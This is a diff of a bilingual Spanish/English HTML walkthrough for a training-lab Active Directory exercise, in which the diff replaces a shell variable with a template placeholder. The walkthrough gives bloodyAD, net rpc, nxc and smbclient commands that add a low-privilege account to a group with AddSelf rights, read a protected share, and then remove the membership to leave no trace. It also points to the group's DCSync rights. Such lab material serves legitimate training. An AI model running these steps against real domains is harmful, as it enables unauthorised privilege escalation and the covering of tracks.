@@ -27,38 +27,36 @@ bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} \
     <p>Tener <code>WriteProperty</code> sobre el atributo <code>member</code> de un grupo (o el derecho extendido <em>Self-Membership / AddSelf</em>) permite modificar quién pertenece al grupo. Añadiéndote a ti mismo heredas todos los permisos del grupo de forma inmediata. BloodHound lo dibuja como <strong>AddSelf</strong> o <strong>WriteMember → Group</strong>.</p>
 
     <h3>2 · Añadirse al grupo</h3>
-    <pre>export DC={{ ad_dc_ip }}
-
-# bloodyAD
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre># bloodyAD
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   add groupMember 'IT Support' svc.readonly
 
 # net rpc
 net rpc group addmem 'IT Support' 'svc.readonly' \
-  -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S $DC
+  -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S {{ ad_dc_ip }}
 
 # samba-tool desde una máquina unida (si aplica)
 # samba-tool group addmembers "IT Support" svc.readonly</pre>
 
     <h3>3 · Confirmar la pertenencia</h3>
     <p><code>nxc ldap</code> no funciona contra este DC (falla el bind NTLM, ver AD 02) — usa <code>bloodyAD</code>:</p>
-    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   get object 'IT Support' --attr member
 
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   get object svc.readonly --attr memberOf</pre>
     <p>Importante: la pertenencia a grupos se materializa en un <strong>nuevo</strong> ticket Kerberos / nueva sesión. Vuelve a autenticarte para que el token incluya el grupo.</p>
 
     <h3>4 · Capturar la flag</h3>
-    <pre>nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --shares
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --shares
 # El recurso it_share ahora aparece como accesible
 
-smbclient //$DC/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt -'</pre>
     <pre>HL{···}</pre>
 
     <h3>5 · Limpieza</h3>
     <p>Quítate del grupo cuando termines para no dejar rastro persistente:</p>
-    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   remove groupMember 'IT Support' svc.readonly</pre>
     <p>Ojo: este mismo grupo <code>IT Support</code> tiene derechos de replicación (DCSync) delegados — es el enlace directo con el lab AD 10.</p>
 
@@ -78,38 +76,36 @@ smbclient //$DC/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get 
     <p>Holding <code>WriteProperty</code> on a group's <code>member</code> attribute (or the extended <em>Self-Membership / AddSelf</em> right) lets you change who belongs to the group. By adding yourself you immediately inherit all of the group's permissions. BloodHound draws it as <strong>AddSelf</strong> or <strong>WriteMember → Group</strong>.</p>
 
     <h3>2 · Add yourself to the group</h3>
-    <pre>export DC={{ ad_dc_ip }}
-
-# bloodyAD
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre># bloodyAD
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   add groupMember 'IT Support' svc.readonly
 
 # net rpc
 net rpc group addmem 'IT Support' 'svc.readonly' \
-  -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S $DC
+  -U "{{ ad_domain }}"/'svc.readonly'%'ReadOnly123!' -S {{ ad_dc_ip }}
 
 # samba-tool from a joined machine (if applicable)
 # samba-tool group addmembers "IT Support" svc.readonly</pre>
 
     <h3>3 · Confirm the membership</h3>
     <p><code>nxc ldap</code> does not work against this DC (the NTLM bind fails, see AD 02) — use <code>bloodyAD</code>:</p>
-    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   get object 'IT Support' --attr member
 
-bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   get object svc.readonly --attr memberOf</pre>
     <p>Important: group membership only lands in a <strong>fresh</strong> Kerberos ticket / new session. Re-authenticate so the token carries the group.</p>
 
     <h3>4 · Capture the flag</h3>
-    <pre>nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --shares
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --shares
 # The it_share share now shows up as accessible
 
-smbclient //$DC/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/it_share -U '{{ ad_domain }}\svc.readonly%ReadOnly123!' -c 'get flag-ad-09.txt -'</pre>
     <pre>HL{···}</pre>
 
     <h3>5 · Cleanup</h3>
     <p>Remove yourself from the group when done so you leave no persistent trace:</p>
-    <pre>bloodyAD --host $DC -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
+    <pre>bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u svc.readonly -p 'ReadOnly123!' \
   remove groupMember 'IT Support' svc.readonly</pre>
     <p>Note: this very <code>IT Support</code> group has replication (DCSync) rights delegated — it is the direct bridge into lab AD 10.</p>
 
